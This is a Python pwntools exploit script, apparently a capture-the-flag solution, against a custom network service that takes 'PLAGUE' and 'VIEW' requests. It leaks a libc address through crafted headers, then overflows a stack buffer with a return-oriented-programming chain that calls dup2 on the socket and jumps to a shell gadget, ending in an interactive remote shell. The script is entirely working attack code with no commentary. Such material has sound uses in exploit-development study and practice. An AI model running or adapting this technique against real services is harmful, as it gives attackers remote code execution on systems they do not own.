from pwn import *
import struct

# 1 etapa

host = '127.0.0.1'
#host = '172.17.0.2'
#host = '94.237.54.153'
port = 9001
#port = 49141

p = remote(host, port)

libc = ELF('/usr/lib/x86_64-linux-gnu/libc-2.31.so')

# request_handler()

payload = b''
payload += b'PLAGUE\x00' # action
payload += b'A' * 30
payload += b'\r\n'

p.send(payload)

# parse_headers()

payload = b''
payload += b'Content-Length: 400\r\n'
payload += b'Plague-Target: Bozwkd\r\n'
payload += b'\r\n\r\n'

p.send(payload)

# 2 etapa

p = remote(host, port)


# request_handler()

payload = b''
payload += b'PLAGUE\x00' # action
payload += b'B' * 30
payload += b'\r\n'

p.send(payload)

# parse_headers()

payload = b''
payload += b'Content-Length: 16\r\n'
payload += b'Plague-Target: Bujk\r\n'
payload += b'\r\n\r\n'

p.send(payload)

p.sendline(b'A' * 5)

p.recvline()
p.recv(6)

leak_libc = u64(p.recv(8).ljust(8, b'\x00'))

libc.address = leak_libc - 0x1ecbe0
dup2 = libc.address + 0x10eae0

print ("Libc: ", hex(libc.address))
print ("dup2: ", hex(dup2))


# 3 etapa

p = remote(host, port)

# request_handler()

payload = b''
payload += b'VIEW\x00'
payload += b'A' * (1024 - len(payload))
payload += b'\r\n'

p.send(payload)

# parse_headers()

payload = b''
payload += b'A' * 2125

payload += p64(libc.address + 0x0000000000023b6a) # pop rdi; ret
payload += p64(6)
payload += p64(libc.address + 0x000000000002601f) # pop rsi; ret
payload += p64(0)
payload += p64(dup2)

payload += p64(libc.address + 0x0000000000023b6a) # pop rdi; ret
payload += p64(6)
payload += p64(libc.address + 0x000000000002601f) # pop rsi; ret
payload += p64(1)
payload += p64(dup2)

payload += p64(libc.address + 0x0000000000023b6b) # ret

payload += p64(libc.address + 0x000000000002f709) # pop r12 ; ret
payload += p64(0)
payload += p64(libc.address + 0x0000000000023b6b) # ret

payload += p64(libc.address + 0xe3afe)

payload += b'A' * (2300 - len(payload))
payload += b'\r\n\r\n'

p.send(payload)

p.interactive()
